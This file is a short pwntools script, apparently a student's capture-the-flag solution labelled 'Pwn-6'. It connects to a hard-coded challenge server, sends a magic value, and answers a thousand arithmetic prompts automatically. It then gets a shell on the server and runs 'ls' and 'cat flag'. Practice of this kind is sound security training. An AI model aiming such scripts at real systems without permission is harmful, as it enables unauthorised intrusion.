# 張元_Pwn-6
from pwn import *

r = remote('140.110.112.218', 2116)
r.recvuntil('\n')

magic = 0x79487ff
r.sendline(p32(magic))

r.recvuntil('\n')

for i in range(1000):
    equation = r.recvuntil('?')
    equation = equation.decode('utf-8')
    print(equation)
    i1 = int(equation.split(' ')[0])
    op = equation.split(' ')[1]
    i2 = int(equation.split(' ')[2])

    if op == '+':
        r.sendline(str(i1 + i2))
    elif op == '-':
        r.sendline(str(i1 - i2))
    elif op == '*':
        r.sendline(str(i1 * i2))
    else:
        print('Error')

r.recvuntil('Welcome hacker!')
r.sendline('ls')
r.sendline('cat flag')

r.interactive()